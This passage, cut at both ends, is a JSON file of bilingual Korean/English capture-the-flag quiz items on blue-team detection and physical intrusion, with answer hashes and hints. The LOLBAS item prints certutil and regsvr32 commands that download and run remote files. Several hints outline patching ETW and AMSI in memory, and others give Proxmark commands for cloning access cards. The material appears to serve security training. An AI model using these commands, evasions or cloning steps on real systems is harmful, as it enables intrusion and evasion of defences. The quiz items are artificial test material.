    "cat": "detection",
    "track": "blueteam",
    "points": 125,
    "ci": true,
    "hash": "30dbb0eea41764b8f9cbc25277d55b8e4035c231c2bbfa344214adf7a04ee8dd",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "윈도우가 스스로 흘리는 것",
      "en": "What Windows Emits by Itself"
    },
    "prompt": {
      "ko": "윈도우 커널과 수백 개의 구성 요소가 자기 안에서 벌어지는 일을 실시간으로 흘려보내는 기본 계측 장치입니다. 제공자가 내보내고 세션이 모으며 소비자가 받아 가는 구조라, 보안 제품들은 `.NET` 어셈블리 적재나 PowerShell 스크립트 블록 같은 것을 여기서 받아 봅니다. 그래서 공격자는 자기 프로세스 안에서 이 통로를 끊는 수법을 즐겨 씁니다. 세 글자 약어는?",
      "en": "The built-in instrumentation through which the Windows kernel and hundreds of components emit, in real time, what is happening inside them. Providers write, sessions collect and consumers read, which is how security products see things like a `.NET` assembly being loaded or a PowerShell script block. It is also why adversaries like to sever this pipe inside their own process. What is the three-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "Event Tracing for Windows 의 머리글자입니다.",
        "자기 프로세스 안의 함수 하나를 즉시 반환하도록 고쳐 놓으면 그 프로세스에서 나가는 흐름만 조용히 끊깁니다 — 시스템 전체는 멀쩡해 보입니다."
      ],
      "en": [
        "The initials of Event Tracing for Windows.",
        "Patch one function inside your own process to return immediately and only that process stops emitting — the rest of the system looks perfectly healthy."
      ]
    }
  },
  {
    "id": "t3_amsi",
    "tier": 3,
    "cat": "detection",
    "track": "blueteam",
    "points": 130,
    "ci": true,
    "hash": "8d7c969ccf0975a7766a17c3beaccbd26de1cadf2bf2fabd4e7125a8471611d2",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "풀어 놓은 뒤에 본다",
      "en": "Looked At After It Unwraps"
    },
    "prompt": {
      "ko": "난독화된 스크립트는 디스크에서 봐야 아무 소용이 없습니다. 그래서 윈도우는 PowerShell·VBScript·오피스 매크로가 코드를 실행 직전에 넘겨 주면 등록된 백신에 검사시키는 표준 창구를 둡니다. 평문으로 풀린 상태를 보기 때문에 껍데기를 아무리 씌워도 소용이 없고, 그래서 공격자는 자기 프로세스에 적재된 그 DLL 의 검사 함수를 메모리에서 고쳐 무력화합니다. 네 글자 약어는?",
      "en": "Looking at an obfuscated script on disk tells you nothing, so Windows provides a standard doorway where PowerShell, VBScript and Office macros hand code over just before it runs and the registered antivirus inspects it. It sees the plaintext after every wrapper is gone, which is why attackers patch the scanning function of its DLL in their own process memory instead. What is the four-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "Antimalware Scan Interface 의 머리글자입니다.",
        "검사 함수가 \"깨끗함\"에 해당하는 값을 곧바로 돌려주게 만드는 몇 바이트짜리 수정이 가장 흔한 무력화 방법입니다."
      ],
      "en": [
        "The initials of Antimalware Scan Interface.",
        "The usual defeat is a few bytes that make the scanning function return the value meaning \"clean\" straight away."
      ]
    }
  },
  {
    "id": "t3_lolbas",
    "tier": 3,
    "cat": "detection",
    "track": "blueteam",
    "points": 130,
    "ci": true,
    "hash": "57ea3f83892b765075bcc3af5798a4c13862900e18911ad45a4281fab7426e62",
    "fmt": "약어 / acronym (6글자 / 6 chars)",
    "title": {
      "ko": "이미 서명되어 들어 있는 무기",
      "en": "Weapons That Shipped Signed"
    },
    "prompt": {
      "ko": "`certutil -urlcache -f http://.../a.exe a.exe` 로 파일을 내려받고, `regsvr32 /s /i:http://.../a.sct scrobj.dll` 로 원격 스크립트를 돌립니다. 둘 다 마이크로소프트가 서명해 윈도우에 기본으로 들어 있는 실행 파일이라 허용 목록도 서명 검사도 통과합니다. 이렇게 전용 도구를 들고 오지 않고 있는 것만으로 해내는 방식과, 그런 파일들을 모아 둔 공개 목록을 함께 가리키는 여섯 글자 약어는?",
      "en": "`certutil -urlcache -f http://.../a.exe a.exe` fetches a file; `regsvr32 /s /i:http://.../a.sct scrobj.dll` runs a remote script. Both are Microsoft-signed executables that ship with Windows, so they satisfy allow-lists and signature checks alike. Which six-letter abbreviation names both this way of working — bringing no tooling of your own and using only what is already there — and the public catalogue of such files?"
    },
    "hints": {
      "ko": [
        "\"땅에서 나는 것으로 살아간다\"는 영어 표현의 머리글자에, 그 대상인 바이너리와 스크립트를 뜻하는 두 글자를 덧붙인 이름입니다.",
        "유닉스 쪽에도 같은 발상의 짝이 되는 목록이 따로 있습니다."
      ],
      "en": [
        "The initials of the English expression for living off the land, followed by two letters for the binaries and scripts it covers.",
        "The Unix side has its own companion catalogue built on the same idea."
      ]
    }
  },
  {
    "id": "t4_ueba",
    "tier": 4,
    "cat": "detection",
    "track": "blueteam",
    "points": 140,
    "ci": true,
    "hash": "3d6815483239738fb2142821f7ded8e61c7fa51fcbdf94d10a06e4eb124f4feb",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "평소와 다른 하루",
      "en": "A Day Unlike the Others"
    },
    "prompt": {
      "ko": "규칙은 \"무엇이 나쁜지\"를 미리 적어 둬야 하지만, 이 방식은 사람과 계정과 장비마다 평소 모습을 몇 주에 걸쳐 학습해 두고 거기서 벗어나는 순간에 점수를 매깁니다. 늘 서울에서 낮에 접속하던 계정이 새벽 세 시에 다른 나라에서 들어와 평소의 200배를 내려받으면, 규칙 하나 없이도 위험 점수가 올라갑니다. 사람뿐 아니라 서버·서비스 계정 같은 개체까지 함께 본다는 뜻이 이름에 들어 있는 네 글자 약어는?",
      "en": "A rule has to state in advance what is bad. This approach instead learns, over weeks, what each person, account and machine normally looks like, and scores the moments that depart from it. An account that always signs in from Seoul during the day, arriving from another country at three in the morning and pulling two hundred times its usual volume, raises a risk score without any rule being written. Its name says it watches not only people but entities such as servers and service accounts. What is the four-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "User and Entity Behavior Analytics 의 머리글자입니다.",
        "학습 기간에 이미 침해된 상태였다면 그 침해가 \"평소\"로 굳어져 영영 눈에 띄지 않습니다."
      ],
      "en": [
        "The initials of User and Entity Behavior Analytics.",
        "If the estate was already compromised while the baseline was being learned, the compromise becomes \"normal\" and is never flagged."
      ]
    }
  },
  {
    "id": "t4_soar",
    "tier": 4,
    "cat": "ir",
    "track": "blueteam",
    "points": 150,
    "ci": true,
    "hash": "3388452318b2e7225fe9e2d8f00db264cae9f9468d0a31e2cd7fbf9c47a9c555",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "사람이 손으로 하던 스무 단계",
      "en": "The Twenty Steps Somebody Used to Do by Hand"
    },
    "prompt": {
      "ko": "경보 하나가 뜰 때마다 분석가는 평판 조회를 하고, 자산 대장에서 주인을 찾고, 메일을 보내고, 티켓을 열고, 필요하면 단말을 망에서 떼어 냅니다. 이 계층은 그 스무 단계를 여러 제품의 API 를 엮은 하나의 흐름으로 미리 그려 두고, 조건 분기와 \"사람이 여기서 승인\" 지점까지 넣어 자동으로 돌립니다. 네 글자 약어로 무엇일까요?",
      "en": "For every alert an analyst looks up a reputation, finds the owner in the asset inventory, sends mail, opens a ticket, and if need be cuts the endpoint off the network. This layer draws those twenty steps in advance as one flow stitched together from several products' APIs, complete with conditional branches and points where a human must approve, and then runs it. Which four-letter abbreviation names it?"
    },
    "hints": {
      "ko": [
        "Security Orchestration, Automation and Response 의 머리글자입니다.",
        "자동화가 잘못된 경보 위에서 돌면 실수도 사람보다 훨씬 빠르게 퍼집니다 — 그래서 되돌리는 흐름을 함께 그려 둡니다."
      ],
      "en": [
        "The initials of Security Orchestration, Automation and Response.",
        "Automation running on a wrong alert spreads the mistake far faster than a human would, which is why the undo flow is drawn alongside it."
      ]
    }
  },
  {
    "id": "t4_mttd",
    "tier": 4,
    "cat": "ir",
    "track": "blueteam",
    "points": 150,
    "ci": true,
    "hash": "b67500796c18ea2238889db21cc98656fb1532373940096226b594b6642da11a",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "들어온 날과 알아챈 날 사이",
      "en": "Between the Day In and the Day Noticed"
    },
    "prompt": {
      "ko": "침입이 시작된 시각부터 방어하는 쪽이 그것을 처음 알아차린 시각까지의 평균 간격을 재는 지표입니다. 업계 보고서가 해마다 \"며칠\"이라고 발표하는 그 숫자이고, 이 값이 길수록 공격자가 조용히 돌아다닌 기간도 그만큼 깁니다. 알아챈 뒤에 얼마나 빨리 수습했는지는 짝을 이루는 다른 지표가 따로 잽니다. 네 글자 약어는?",
      "en": "The metric for the average gap between the moment an intrusion begins and the moment the defenders first notice it. It is the number industry reports publish each year as \"so many days\", and the longer it runs the longer an adversary moved around unseen. How quickly matters were set right afterwards is measured by a separate, companion metric. What is the four-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "Mean Time To Detect 의 머리글자입니다.",
        "끝내 스스로 알아채지 못하고 외부 통보로 알게 된 사건은 평균에서 조용히 빠지기 쉬워, 숫자가 실제보다 좋아 보입니다."
      ],
      "en": [
        "The initials of Mean Time To Detect.",
        "Cases the organisation never noticed itself, learning of them from an outside notification, tend to fall out of the average and make the number look better than it is."
      ]
    }
  },
  {
    "id": "t4_mttr",
    "tier": 4,
    "cat": "ir",
    "track": "blueteam",
    "points": 155,
    "ci": true,
    "hash": "3c6e9d75e65f66cf5345c98ebbeeedc1d5571e499f73f6b0e3e492475d17acc4",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "알아챈 다음이 진짜다",
      "en": "Noticing Is Only Half of It"
    },
    "prompt": {
      "ko": "경보가 뜬 다음부터 위협을 걷어 내고 업무를 정상으로 되돌리기까지 걸린 평균 시간입니다. 마지막 글자를 무엇으로 읽느냐에 따라 대응·복구·수습 등으로 조금씩 달리 쓰이기 때문에, 지표를 발표할 때는 시계를 언제 멈추는지부터 정의해 두어야 합니다. 침입을 알아차리기까지 걸린 시간은 짝을 이루는 다른 지표가 잽니다. 네 글자 약어는?",
      "en": "The average time from the alert going up to the threat being removed and normal work resumed. What the last letter stands for varies — respond, recover, remediate — so any published figure has to define when the clock stops. Time taken to notice the intrusion in the first place is what the companion metric measures. What is the four-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "Mean Time To 로 시작하는 네 낱말의 머리글자이고, 마지막 낱말은 R 로 시작합니다.",
        "단말을 망에서 떼어 낸 시각에 시계를 멈추면 숫자는 예뻐지지만, 공격자가 남긴 지속성이 그대로 남아 있는 경우가 있습니다."
      ],
      "en": [
        "The initials of four words starting with Mean Time To, the last beginning with R.",
        "Stopping the clock when the endpoint left the network makes the figure look good while the persistence the adversary left behind is still sitting there."
      ]
    }
  },
  {
    "id": "t4_navigator",
    "tier": 4,
    "cat": "intel",
    "track": "blueteam",
    "points": 160,
    "ci": true,
    "hash": "ebf49dcd836f810084c14e0f2dab4dc1768bbdc5980481bf201fcf76771dff7a",
    "fmt": "도구 이름 / tool name (9글자 / 9 chars)",
    "title": {
      "ko": "격자를 색칠하다",
      "en": "Colouring In the Grid"
    },
    "prompt": {
      "ko": "MITRE ATT&CK 의 기법 격자를 웹에서 펼쳐 놓고, 칸마다 점수와 색을 입혀 JSON 레이어로 저장하는 공식 도구입니다. 우리가 탐지하는 기법을 초록으로 칠한 레이어와 특정 공격 집단이 쓰는 기법을 칠한 레이어를 겹쳐 빼기 연산을 하면, 빨갛게 남는 칸이 곧 우리가 못 보는 구멍입니다. 이 도구의 이름은?",
      "en": "The official web tool that lays out the MITRE ATT&CK technique grid and lets you score and colour each cell, saving the result as a JSON layer. Colour one layer green for the techniques you detect, another for the techniques a particular group uses, then subtract one from the other: the cells left red are the holes you cannot see through. What is the tool called?"
    },
    "hints": {
      "ko": [
        "배를 몰아 길을 찾는 사람을 뜻하는 영어 낱말이고, 아홉 글자입니다.",
        "격자를 온통 초록으로 칠해 놓고 만족하는 것이 가장 흔한 함정입니다 — 규칙이 있다는 것과 그 규칙이 실제로 걸린다는 것은 다릅니다."
      ],
      "en": [
        "The English word for the person who steers a ship and finds the way, nine letters long.",
        "The usual trap is painting the whole grid green and feeling safe — having a rule and having a rule that actually fires are not the same thing."
      ]
    }
  },
  {
    "id": "t4_emulation",
    "tier": 4,
    "cat": "intel",
    "track": "blueteam",
    "points": 160,
    "ci": true,
    "hash": "9011e2be96ee602be60f9778230797fbbfafe98a33a3bdd61d273820df5f7ddc",
    "fmt": "한 단어 / one word (9글자 / 9 chars)",
    "title": {
      "ko": "그 집단인 척 해 보기",
      "en": "Playing That Group for a Week"
    },
    "prompt": {
      "ko": "막연히 \"침투해 보라\"가 아니라, 위협 정보가 특정 공격 집단에 대해 기록해 둔 순서를 그대로 재현해 우리 탐지가 어느 단계에서 울리는지 확인하는 훈련 방식입니다. 그 집단이 쓰던 적재 방식과 통신 주기까지 흉내 내고, 각 단계마다 경보가 떴는지를 표로 남깁니다. 이 방식을 가리키는 아홉 글자 한 단어는?",
      "en": "Not a vague \"try to break in\", but an exercise that reproduces, step for step, the sequence threat intelligence has recorded for one particular group, to see at which step your detection fires. The loading method and the callback interval that group used are imitated too, and whether an alarm went up at each step is written down in a table. Which nine-letter word names this?"
    },
    "hints": {
      "ko": [
        "흉내 낸다는 뜻의 영어 동사에서 온 명사이고, 아홉 글자입니다. 하드웨어를 흉내 내는 프로그램에도 같은 뿌리의 낱말을 씁니다.",
        "비슷해 보이는 낱말로 \"가상으로 해 보기\"가 있는데, 그쪽은 실제로 실행하지 않고 탁상에서 따져 보는 쪽을 가리킵니다."
      ],
      "en": [
        "A noun from the English verb meaning to imitate, nine letters long; a program that imitates hardware takes its name from the same root.",
        "A similar-looking word means working it through on paper without actually running anything — that is the other kind of exercise."
      ]
    }
  },
  {
    "id": "t4_purple",
    "tier": 4,
    "cat": "ir",
    "track": "blueteam",
    "points": 170,
    "ci": true,
    "hash": "8e0a1b0ada42172886fd1297e25abf99f14396a9400acbd5f20da20289cff02f",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "두 색을 섞으면",
      "en": "Mix the Two Colours"
    },
    "prompt": {
      "ko": "공격하는 쪽은 보고서를 덮어 놓고 몇 달 뒤에 결과만 내놓고, 지키는 쪽은 무엇이 지나갔는지 모른 채 규칙을 다듬습니다. 이 방식은 두 팀을 한 방에 앉혀 놓고, 기법 하나를 실행하는 즉시 화면을 같이 보며 \"울렸나? 안 울렸다면 왜?\"를 그 자리에서 고쳐 다시 실행합니다. 두 팀을 상징하는 색을 섞으면 나오는 이 이름은? (여섯 글자 한 단어)",
      "en": "One side keeps its report closed and delivers findings months later; the other tunes rules without knowing what went past them. This way of working sits both teams in one room, runs a single technique, watches the console together — \"did it fire? if not, why?\" — fixes it on the spot and runs it again. Mix the colours that stand for the two teams and you get this name. (one word, six letters)"
    },
    "hints": {
      "ko": [
        "빨강과 파랑을 섞으면 나오는 색입니다.",
        "상설 조직이라기보다 일하는 방식에 가까워서, 두 팀이 그대로 있어도 이렇게 앉기만 하면 됩니다."
      ],
      "en": [
        "The colour you get by mixing red and blue.",
        "It is less a standing team than a way of working: the two teams can stay as they are and simply sit down like this."
      ]
    }
  },
  {
    "id": "t4_nist",
    "tier": 4,
    "cat": "ir",
    "track": "blueteam",
    "points": 180,
    "ci": true,
    "hash": "1b29226934e647c506c97b905f5a02a85a51bf786a0c72cd601765e0e3d2ff2d",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "네 단계로 도는 바퀴",
      "en": "A Wheel of Four Stages"
    },
    "prompt": {
      "ko": "미국 상무부 산하의 표준·기술 기관이 펴낸 특별 간행물 800-61 은 사고 대응을 준비 / 탐지와 분석 / 봉쇄·근절·복구 / 사후 활동 네 단계가 도는 바퀴로 정리했고, 이 기관의 다른 문서는 식별·보호·탐지·대응·복구 다섯 기능의 골격으로 더 널리 인용됩니다. 마지막 단계에서 배운 것을 다시 첫 단계로 돌려보내는 것이 이 모형의 핵심입니다. 이 기관의 네 글자 약어는?",
      "en": "Special Publication 800-61, from the standards and technology institute under the US Department of Commerce, lays incident response out as a wheel of four stages — preparation; detection and analysis; containment, eradication and recovery; post-incident activity — and another document from the same institute is more widely cited for its five functions: identify, protect, detect, respond, recover. Feeding what the last stage learned back into the first is the point of the model. What is that institute's four-letter abbreviation?"
    },
    "hints": {
      "ko": [
        "National Institute of Standards and Technology 의 머리글자입니다.",
        "여섯 단계로 나눈 다른 유명한 모형도 있는데, 그쪽은 봉쇄·근절·복구를 각각 떼어 셉니다."
      ],
      "en": [
        "The initials of the National Institute of Standards and Technology.",
        "Another well-known model counts six stages instead, splitting containment, eradication and recovery apart."
      ]
    }
  },
  {
    "id": "t4_jitter",
    "tier": 4,
    "cat": "detection",
    "track": "blueteam",
    "points": 190,
    "ci": true,
    "hash": "16c7dc721bc2a15a1c933bd9aad8edd44a36d2bb20a3391337e268eb5895cea0",
    "fmt": "한 단어 / one word (6글자 / 6 chars)",
    "title": {
      "ko": "시계처럼 정확한 것이 수상하다",
      "en": "Suspiciously Punctual"
    },
    "prompt": {
      "ko": "감염된 단말이 명령·제어 서버에 60초마다 정확히 한 번씩 물어보면, 방어하는 쪽은 목적지가 무엇이든 그 규칙적인 박자만으로 잡아냅니다. 그래서 공격 도구는 잠드는 시간을 60초 ±40% 처럼 매번 흩뜨려 박자를 지웁니다. 이 흩뜨림을 가리키는 여섯 글자 한 단어는? 네트워크 쪽에서는 지연 시간이 들쭉날쭉한 정도를 가리키는 같은 낱말입니다.",
      "en": "If an infected endpoint asks its command-and-control server for orders exactly once every sixty seconds, defenders can pick it out from that regular rhythm alone, whatever the destination. So the tooling scatters the sleep — sixty seconds plus or minus forty percent, redrawn each time — and the rhythm disappears. Which six-letter word names that scattering? On the network side the same word describes how much latency varies."
    },
    "hints": {
      "ko": [
        "\"떨림\"이나 \"흔들림\"을 뜻하는 영어 낱말이고, 여섯 글자입니다.",
        "흩뜨려도 평균은 남습니다 — 하루치를 모아 간격의 분포를 보면 사람이 만든 통신과는 여전히 다른 모양이 나옵니다."
      ],
      "en": [
        "The English word for a shake or a wobble, six letters long.",
        "Scattering does not remove the mean: gather a day of intervals and their distribution still does not look like traffic a person generates."
      ]
    }
  },
  {
    "id": "t4_opencti",
    "tier": 4,
    "cat": "intel",
    "track": "blueteam",
    "points": 200,
    "ci": true,
    "hash": "b9c04d711edce04ee74cf5f63235df53bcff3c8eae171947811d59dbec261fa4",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "지식을 그래프로 쌓다",
      "en": "Knowledge Stacked as a Graph"
    },
    "prompt": {
      "ko": "프랑스에서 시작한 오픈소스 위협 정보 플랫폼입니다. 표준 위협 표현 객체를 그대로 자료 모형으로 삼아 그래프 데이터베이스에 쌓고, GraphQL API 와 커넥터 구조로 외부 피드를 끌어와 같은 그래프에 합칩니다. 개별 흔적을 던져 두는 창고가 아니라 공격 집단·기법·침해 사건이 관계로 이어진 지식 그래프를 만드는 것이 목표라, 같은 대상을 가리키는 서로 다른 출처를 하나로 합치는 기능이 중심에 있습니다. 이 플랫폼의 이름은?",
      "en": "An open-source threat intelligence platform that began in France. It takes the standard threat representation objects as its data model, stores them in a graph database, and pulls outside feeds into the same graph through a GraphQL API and a connector architecture. The goal is not a warehouse of loose indicators but a knowledge graph where groups, techniques and incidents are joined by relationships, so merging different sources that describe the same thing sits at its centre. What is the platform called?"
    },
    "hints": {
      "ko": [
        "이름은 \"열려 있다\"는 영어 낱말 뒤에 이 분야를 가리키는 세 글자 약어를 붙여 한 낱말로 씁니다.",
        "커넥터가 같은 대상을 다른 이름으로 계속 집어넣으면 그래프가 중복으로 부풀어, 합치는 규칙을 손보는 것이 운영의 대부분이 됩니다."
      ],
      "en": [
        "The name is the English word for open with this field's three-letter abbreviation stuck to it, written as one word.",
        "When connectors keep inserting the same object under different names the graph bloats with duplicates, and tuning the merge rules becomes most of the operational work."
      ]
    }
  }
  ,
  {
    "id": "t0_tailgate",
    "tier": 0,
    "cat": "recon",
    "track": "physical",
    "points": 50,
    "ci": true,
    "hash": "37a73c503ccb3a4d58086b0eac683493e9e63292a56af36299574f08edcbd41a",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "뒤를 따라",
      "en": "Right Behind You"
    },
    "prompt": {
      "ko": "인가된 사람이 배지로 문을 연 직후, 자신의 자격 증명 없이 바로 뒤따라 통제 구역으로 들어가는 물리 침투 기법을 무엇이라 부르는가?",
      "en": "An authorised person badges a door open; you slip through right behind them with no credential of your own. What is this physical-entry technique called?"
    },
    "hints": {
      "ko": [
        "출퇴근 러시아워에 성공률이 가장 높다.",
        "피해자가 눈치채지 못한 채 이루어진다는 점에서, 도움을 부탁해 문을 잡게 만드는 방식과 구별된다."
      ],
      "en": [
        "Success rate peaks during the morning and evening rush.",
        "It differs from the variant where you ask someone to hold the door: here the victim never knows."
      ]
    }
  },
  {
    "id": "t0_skimming",
    "tier": 0,
    "cat": "rfid",
    "track": "physical",
    "points": 50,
    "ci": true,
    "hash": "b27947c8b049242a090bd1b144f1632b9343107134ae594aaf2db06326779405",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "지나가며 한 번",
      "en": "One Pass, Up Close"
    },
    "prompt": {
      "ko": "피해자 옆에 슬쩍 붙어 지갑이나 주머니 속 출입 카드에 리더를 가까이 대고, 본인 모르게 카드의 무선 신호를 읽어 복제를 준비하는 행위를 무엇이라 부르는가? (한 단어)",
      "en": "Slipping up next to someone and holding a reader close to the access card in their wallet or pocket, reading its radio signal without their knowledge to prepare a copy. What is this called? (one word)"
    },
    "hints": {
      "ko": [
        "우유 위의 크림을 '걷어 내듯' 정보를 얕게 떠 간다는 뜻의 낱말이다.",
        "저주파 카드는 이 방식으로 5~10cm 거리에서 몇 초 만에 읽힌다."
      ],
      "en": [
        "The word is the one for lifting the cream off the top of the milk — here, the card data with a scanner.",
        "A low-frequency card can be lifted this way in seconds from 5-10 cm."
      ]
    }
  },
  {
    "id": "t1_wiegand",
    "tier": 1,
    "cat": "rfid",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "4ddb6fb26b0402e3e68bb58270c9c82610ae6219e5c53afbb118e1dbc7315eb5",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "두 가닥의 평문",
      "en": "Two Wires, No Secrets"
    },
    "prompt": {
      "ko": "카드 리더와 문 안쪽 컨트롤러를 잇는 고전적인 배선 규약은 DATA0/DATA1 두 신호선으로 카드 번호를 암호화 없이 그대로 전송한다. 신호선에 소형 장치를 물리면 도청과 리플레이가 가능하다. 이 규약의 이름은?",
      "en": "The classic wiring between a card reader and the controller inside the door sends the card number over two lines (DATA0/DATA1) with no encryption at all. Tap the wire and you can eavesdrop and replay. Name the protocol."
    },
    "hints": {
      "ko": [
        "한 사람 이름에서 따왔다.",
        "이를 대체하려고 뒤에 암호화·양방향 리더 표준이 만들어졌다."
      ],
      "en": [
        "It is named after a person.",
        "An encrypted, two-way reader standard was later built to replace it."
      ]
    }
  },
  {
    "id": "t1_proxmark",
    "tier": 1,
    "cat": "rfid",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "005efc0a070010ef2604d2445710ff748500ed69a008ffe7ceb1af992cf5d201",
    "fmt": "도구 이름 / tool name (9글자 / 9 chars)",
    "title": {
      "ko": "카드 실험실",
      "en": "The Card Lab"
    },
    "prompt": {
      "ko": "125 kHz 저주파와 13.56 MHz 고주파 무선 출입 카드를 모두 읽고, 쓰고, 에뮬레이션하며 리더-카드 통신을 스니핑할 수 있는 대표적인 오픈소스 연구 장비의 이름은? (제품명 그대로, 버전 숫자 포함)",
      "en": "The best-known open-source device for researching contactless access cards: it reads, writes and emulates both 125 kHz and 13.56 MHz cards and can sniff reader-to-card traffic. Give the product name exactly, including its version digit."
    },
    "hints": {
      "ko": [
        "명령 예: `lf search`, `hf mf autopwn`.",
        "이름은 8글자 영문 뒤에 버전 숫자 하나가 붙어 총 9글자다. RDV4 는 그 최신 하드웨어 리비전."
      ],
      "en": [
        "Sample commands: `lf search`, `hf mf autopwn`.",
        "Eight letters plus one version digit, nine characters total. RDV4 is its latest hardware revision."
      ]
    }
  },
  {
    "id": "t1_bumpkey",
    "tier": 1,
    "cat": "lockpick",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "7350550e0b70fb991a289f0e972c3b48afe3a7cb57e7e66da8dde85468eea9a7",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "한 번의 충격",
      "en": "One Sharp Tap"
    },
    "prompt": {
      "ko": "핀 텀블러 자물쇠의 모든 홈을 최대 깊이로 깎아 만든 특수 열쇠다. 키홀에 넣고 끝을 가볍게 두드리면 그 충격으로 키 핀이 드라이버 핀을 위로 튕겨, 전단선에 순간적으로 틈이 생기고 그 찰나에 플러그가 돈다. 이 열쇠의 이름은? (두 단어)",
      "en": "A key cut so every bitting is at maximum depth. Seat it in the keyhole and tap the end: the impact throws the key pins into the driver pins, opening a momentary gap at the shear line, and you turn the plug in that instant. What is this key called? (two words)"
    },
    "hints": {
      "ko": [
        "이 기법 자체는 '범핑(bumping)'이라 부른다. 여기서 묻는 것은 그 도구다.",
        "스풀 핀·세레이티드 핀은 이 충격을 흡수해 방어한다."
      ],
      "en": [
        "The technique itself is called bumping; this asks for the tool it uses.",
        "Spool and serrated pins defend against it by absorbing the impact."
      ]
    }
  },
  {
    "id": "t1_deadbolt",
    "tier": 1,
    "cat": "lockpick",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "2f69ca657a86d5ebe9acac1df47340c5cd1fc7667ee3831f9422ed369cc96c2c",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "밀리지 않는 빗장",
      "en": "The Bolt That Won't Give"
    },
    "prompt": {
      "ko": "플라스틱 카드를 문틈에 넣어 경사진 빗장을 밀어 넘기는 공격은 스프링으로 튀어나오는 래치볼트에만 통한다. 스프링이 없어 카드로는 밀 수 없고, 열쇠나 손잡이를 돌려야만 움직이는 잠금 방식의 이름은? (한 단어)",
      "en": "Sliding a card into the door gap to push a bevelled bolt back only works on a spring-loaded latch bolt. Name the bolt that has no spring, cannot be pushed with a card, and only moves when a key or thumbturn is turned. (one word)"
    },
    "hints": {
      "ko": [
        "가정집 현관문의 보조 잠금이 보통 이것이다.",
        "영문으로 dead + bolt."
      ],
      "en": [
        "This is usually the secondary lock on a house's front door.",
        "dead + bolt."
      ]
    }
  },
  {
    "id": "t1_dumpster",
    "tier": 1,
    "cat": "recon",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "377bd50a9621a7592d8fea5ec2b152c37583a4d59c52197d6c71be2d39e47fcd",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "버린 것에서 줍기",
      "en": "Picking Through the Trash"
    },
    "prompt": {
      "ko": "폐기된 서류, 라벨, 구형 하드웨어에서 내부 프로세스·조직도·계정 정보를 수집하는 정찰 기법을 흔히 무엇이라 부르는가? (두 단어)",
      "en": "The reconnaissance technique of harvesting internal processes, org charts and account details from discarded documents, labels and old hardware. What is it commonly called? (two words)"
    },
    "hints": {
      "ko": [
        "말 그대로 쓰레기통에 들어가는 행위를 가리킨다.",
        "허가 없이 접근 가능한 것은 공용 도로에서 닿는 쓰레기통뿐이다(관할에 따라 다름)."
      ],
      "en": [
        "It refers, literally, to climbing into the bin.",
        "Only bins reachable from a public road may be approached without permission, and even that varies by jurisdiction."
      ]
    }
  },
  {
    "id": "t1_t5577",
    "tier": 1,
    "cat": "rfid",
    "track": "physical",
    "points": 100,
    "ci": true,
    "hash": "79aa1308c637e1c83b300314c8f01614b9e691b40fb3cef030e62b34bbe1df8f",
    "fmt": "값 그대로 / literal (5글자 / 5 chars)",
    "title": {
      "ko": "빈 카드",
      "en": "The Blank Card"
    },
    "prompt": {
      "ko": "Proxmark 로 읽어낸 EM4100 또는 HID Prox 데이터를 그대로 써 넣어 원본처럼 동작하게 만드는, 여러 저주파 규격을 흉내 낼 수 있는 재기록 가능 범용 카드 칩의 이름은? (제품명 그대로, 5글자)",
      "en": "The rewritable, multi-emulation low-frequency chip that EM4100 or HID Prox data read with a Proxmark gets written onto so a blank behaves like the original. Give the chip name exactly. (5 characters)"
    },
    "hints": {
      "ko": [
        "영문 한 글자 + 숫자 넉 자, 총 다섯 글자.",
        "Proxmark 명령 `lf em 410x clone` 이 기록하는 대상이 바로 이 칩이다."
      ],
      "en": [
        "One letter followed by four digits, five characters.",
        "The Proxmark command `lf em 410x clone` writes onto exactly this chip."
      ]
    }
  },
  {
    "id": "t2_wiegandfc",
    "tier": 2,
    "cat": "rfid",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "5a39cadd1b007093db50744797c7a04a34f73b35ed444704206705b02597d6fd",
    "fmt": "숫자 / number",
    "title": {
      "ko": "26비트의 앞자리",
      "en": "The Front of 26 Bits"
    },
    "prompt": {
      "ko": "신호선 도청으로 잡은 26비트 표준 카드 프레임이다:\n\n`01100011110111000000100111`\n\n구조는 [선행 패리티 1비트][시설 코드 8비트][카드 번호 16비트][후행 패리티 1비트]. 시설 코드(facility code)를 십진수로 구하라.",
      "en": "A 26-bit standard badge frame captured off the wire:\n\n`01100011110111000000100111`\n\nLayout: [leading parity 1][facility code 8][card number 16][trailing parity 1]. Give the facility code as a base-ten number."
    },
    "hints": {
      "ko": [
        "맨 앞 비트를 버리고 그다음 여덟 비트를 이진수로 읽으면 된다.",
        "`11000111` 을 십진수로 바꾼다."
      ],
      "en": [
        "Drop the first bit, then read the next eight bits as a binary number.",
        "Convert `11000111` to a base-ten number."
      ]
    }
  },
  {
    "id": "t2_bcc",
    "tier": 2,
    "cat": "rfid",
    "track": "physical",
    "points": 150,
    "ci": true,
    "hash": "af327a6478537246e0d9f0c589986d5f067d2e2351a1ca5a0a4962424da0e408",
    "fmt": "16진수 / hex (2글자 / 2 chars)",
    "title": {
      "ko": "닫는 바이트",
